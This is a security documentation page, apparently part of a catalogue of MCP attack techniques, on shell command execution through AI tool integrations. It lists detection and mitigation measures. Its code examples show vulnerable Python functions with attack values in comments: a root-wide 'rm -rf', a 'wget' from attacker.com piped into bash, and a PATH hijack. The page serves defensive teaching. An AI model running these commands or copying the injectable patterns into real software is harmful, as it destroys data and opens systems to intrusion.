---
layout: default
title: "Shell Command Execution"
permalink: /ttps/command-injection/shell-command-execution/
nav_order: 5
parent: "Command & Code Injection"
grand_parent: "MCP Security TTPs"
---

# Shell Command Execution

**Category**: Command & Code Injection  
**Severity**: Critical  

## Description

Direct execution of shell commands through poorly secured MCP tools, enabling attackers to execute arbitrary shell commands and scripts on the target system.

## Technical Details

### Attack Vector
- Direct shell command execution
- Shell script injection
- Command line manipulation
- Shell environment exploitation

### Common Techniques
- Shell command chaining
- Script injection
- Shell metacharacter abuse
- Environment variable manipulation

## Impact

- **Shell Access**: Direct access to system shell
- **Command Execution**: Ability to run any shell command
- **Script Execution**: Ability to execute shell scripts
- **System Control**: Control over system through shell access

## Detection Methods

### Shell Monitoring
- Monitor shell process creation
- Track shell command execution
- Detect unusual shell activity
- Monitor shell script execution

### Command Analysis
- Analyze shell command patterns
- Monitor command line arguments
- Track shell metacharacter usage
- Detect command injection patterns

## Mitigation Strategies

### Shell Security
- Restrict shell access
- Use shell command filtering
- Implement shell sandboxing
- Monitor shell activity

### Command Controls
- Use command allow-lists
- Implement command validation
- Deploy shell restrictions
- Monitor command execution

## Real-World Examples

### Example 1: Direct Shell Command
```python
def run_system_command(command):
    # Vulnerable shell command execution
    result = subprocess.run(command, shell=True, capture_output=True)
    
    # Attack: command = "rm -rf / --no-preserve-root"
    # Executed: rm -rf / --no-preserve-root
```

### Example 2: Shell Script Injection
```python
def execute_script(script_content):
    # Vulnerable script execution
    with open('/tmp/script.sh', 'w') as f:
        f.write(script_content)
    os.system('bash /tmp/script.sh')
    
    # Attack: script_content = "#!/bin/bash\nwget http://attacker.com/malware.sh | bash"
    # Executed: Downloads and executes malware
```

### Example 3: Shell Environment Manipulation
```python
def run_with_env(command, env_vars):
    # Vulnerable environment variable usage
    env = os.environ.copy()
    env.update(env_vars)
    subprocess.run(command, shell=True, env=env)
    
    # Attack: env_vars = {"PATH": "/tmp:$PATH"} with malicious binaries in /tmp
    # Executed: Commands execute malicious versions from /tmp
```

## References & Sources

- **Strobes Security** - "MCP and Its Critical Vulnerabilities"
- **Simon Willison** - "Model Context Protocol has prompt injection security problems"

## Related TTPs

- [Command Injection](command-injection.md)
- [OS Command Injection](os-command-injection.md)
- [Code Injection](code-injection.md)

---

*Shell command execution represents a direct path to system compromise through unrestricted shell access.*